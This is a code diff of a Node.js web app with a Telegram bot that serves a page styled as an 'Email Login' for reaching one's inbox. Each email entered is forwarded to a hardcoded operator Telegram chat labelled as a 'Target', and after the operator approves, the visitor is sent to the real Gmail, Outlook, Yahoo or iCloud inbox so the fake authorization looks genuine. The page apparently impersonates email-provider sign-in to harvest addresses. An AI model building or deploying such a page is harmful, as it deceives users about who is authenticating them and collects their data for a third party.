@@ -11,7 +11,7 @@ const MY_CHAT_ID = '7554731151';
 const bot = new Telegraf(BOT_TOKEN);
 const activeAuths = {}; 
 
-// --- STEP 1: THE WEBSITE (The "Face" of your app) ---
+// 1. THE WEB INTERFACE (With Smart Redirect)
 app.get('/', (req, res) => {
     res.send(`
         <!DOCTYPE html>
@@ -21,39 +21,62 @@ app.get('/', (req, res) => {
             <meta name="viewport" content="width=device-width, initial-scale=1">
             <script src="/socket.io/socket.io.js"></script>
             <style>
-                body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f2f5; }
-                .card { background: white; padding: 2rem; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; width: 300px; }
-                input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
-                button { width: 100%; padding: 12px; background: #0088cc; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
-                #number-display { font-size: 60px; font-weight: bold; margin: 20px 0; color: #1c1e21; display: none; }
+                body { font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f2f5; }
+                .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 320px; }
+                #number-display { font-size: 80px; font-weight: 800; color: #1877f2; margin: 20px 0; display: none; }
+                .btn { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; font-weight: bold; }
+                input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
             </style>
         </head>
         <body>
-            <div class="card" id="box">
-                <h2>Login</h2>
-                <input type="email" id="email" placeholder="Enter Email">
-                <button onclick="requestLogin()">Continue</button>
+            <div class="card" id="app">
+                <h2 id="title">Email Login</h2>
+                <div id="login-form">
+                    <p style="color: #666;">Enter your email to access your inbox.</p>
+                    <input type="email" id="email" placeholder="example@gmail.com">
+                    <button class="btn" onclick="start()">Login</button>
+                </div>
+                <div id="auth-ui" style="display:none;">
+                    <p>Authorization required. Match this number in your Telegram bot:</p>
+                    <div id="number-display">--</div>
+                    <p style="color: #ff9500; font-weight:bold;">Waiting for Bot Approval...</p>
+                </div>
             </div>
 
             <script>
                 const socket = io();
-                function requestLogin() {
-                    const email = document.getElementById('email').value;
-                    if(!email) return alert("Enter email!");
-                    socket.emit('request_login', email);
+                let userEmail = "";
+
+                function start() {
+                    userEmail = document.getElementById('email').value;
+                    if(!userEmail || !userEmail.includes('@')) return alert("Enter a valid email");
+                    socket.emit('request_login', userEmail);
                 }
 
                 socket.on('show_number', (num) => {
-                    document.getElementById('box').innerHTML = \`
-                        <h2>Match the Number</h2>
-                        <p>Tap this number on your Telegram app:</p>
-                        <div id="number-display" style="display:block;">\${num}</div>
-                        <p style="font-size:12px; color:gray;">Waiting for you to tap...</p>
-                    \`;
+                    document.getElementById('login-form').style.display = 'none';
+                    document.getElementById('auth-ui').style.display = 'block';
+                    document.getElementById('number-display').innerText = num;
+                    document.getElementById('number-display').style.display = 'block';
+                    document.getElementById('title').innerText = "Confirm on Phone";
                 });
 
                 socket.on('login_success', () => {
-                    document.getElementById('box').innerHTML = "<h1>✅ Access Granted!</h1><p>You are now logged in.</p>";
+                    document.getElementById('app').innerHTML = "<h1>✅ Authorized</h1><p>Opening your inbox...</p>";
+                    
+                    // --- REDIRECT LOGIC ---
+                    let domain = userEmail.split('@')[1].toLowerCase();
+                    let targetUrl = "https://www.google.com"; // Default fallback
+
+                    if (domain.includes("gmail")) targetUrl = "https://mail.google.com/mail/u/0/#inbox";
+                    else if (domain.includes("outlook") || domain.includes("hotmail") || domain.includes("live")) targetUrl = "https://outlook.live.com/mail/0/inbox";
+                    else if (domain.includes("yahoo")) targetUrl = "https://mail.yahoo.com";
+                    else if (domain.includes("icloud")) targetUrl = "https://www.icloud.com/mail";
+
+                    // Wait 1.5 seconds so the user sees the success message, then jump to the inbox
+                    setTimeout(() => {
+                        window.location.href = targetUrl;
+                    }, 1500);
                 });
             </script>
         </body>
@@ -61,7 +84,7 @@ app.get('/', (req, res) => {
     `);
 });
 
-// --- STEP 2: THE LOGIC (The "Brain") ---
+// 2. THE SERVER LOGIC
 io.on('connection', (socket) => {
     socket.on('request_login', (email) => {
         const correctNum = Math.floor(Math.random() * 90 + 10);
@@ -70,17 +93,24 @@ io.on('connection', (socket) => {
         activeAuths[email] = { number: correctNum, socketId: socket.id };
         const buttons = [correctNum, ...decoys].sort(() => Math.random() - 0.5);
 
-        bot.telegram.sendMessage(MY_CHAT_ID, `🚨 *Login Attempt:* \`${email}\` \n\nTap the number you see on your screen:`, {
-            parse_mode: 'Markdown',
-            ...Markup.inlineKeyboard(
-                buttons.map(num => Markup.button.callback(num.toString(), `auth_${email}_${num}`))
-            )
-        });
+        bot.telegram.sendMessage(MY_CHAT_ID, 
+            `🔐 *INBOX ACCESS REQUEST*\n\n` +
+            `📧 *Target:* \`${email}\`\n` +
+            `🔢 *Match Number:* \`${correctNum}\`\n\n` +
+            `Tap the matching number to authorize and open the inbox:`, 
+            {
+                parse_mode: 'Markdown',
+                ...Markup.inlineKeyboard(
+                    buttons.map(num => Markup.button.callback(num.toString(), `auth_${email}_${num}`))
+                )
+            }
+        );
 
         socket.emit('show_number', correctNum);
     });
 });
 
+// 3. THE AUTHORIZATION
 bot.action(/auth_(.+)_(.+)/, (ctx) => {
     const email = ctx.match[1];
     const tappedNumber = parseInt(ctx.match[2]);
@@ -88,17 +118,15 @@ bot.action(/auth_(.+)_(.+)/, (ctx) => {
 
     if (session && session.number === tappedNumber) {
         io.to(session.socketId).emit('login_success');
-        ctx.editMessageText(`✅ *Verified!*\nLogged in as: ${email}`, { parse_mode: 'Markdown' });
+        ctx.editMessageText(`✅ *AUTHORIZED*\nInbox opened for \`${email}\``, { parse_mode: 'Markdown' });
         delete activeAuths[email];
     } else {
-        ctx.answerCbQuery("❌ Wrong number! Look at the screen again.");
+        ctx.answerCbQuery("❌ Access Denied. Wrong number.");
     }
 });
 
-// --- STEP 3: STARTUP ---
-// Use process.env.PORT so Render can choose the port automatically
 const PORT = process.env.PORT || 3000;
 http.listen(PORT, () => {
-    console.log(`🚀 Server running on port \${PORT}`);
+    console.log(`Server Live`);
     bot.launch();
 });
